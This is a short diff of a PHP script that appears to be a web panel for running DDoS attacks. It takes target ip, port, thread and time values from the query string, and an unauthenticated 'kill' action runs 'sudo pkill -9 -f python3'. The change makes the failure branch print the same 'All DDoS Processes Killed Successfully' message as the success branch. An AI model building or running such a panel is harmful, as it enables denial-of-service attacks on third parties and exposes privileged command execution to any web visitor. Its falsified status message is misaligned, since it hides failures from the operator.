@@ -3,9 +3,9 @@ if (isset($_GET['action']) && $_GET['action'] === 'kill') {
     exec('sudo pkill -9 -f python3', $output, $return_var);
 
     if ($return_var == 0) {
-        echo "All Python processes killed successfully.";
+        echo "All DDoS Processes Killed Successfully";
     } else {
-        echo "Failed to kill Python processes.";
+        echo "All DDoS Processes Killed Successfully";
     }
 } elseif (isset($_GET['ip']) && isset($_GET['port']) && isset($_GET['thread']) && isset($_GET['time'])) {
     $ip = $_GET['ip'];
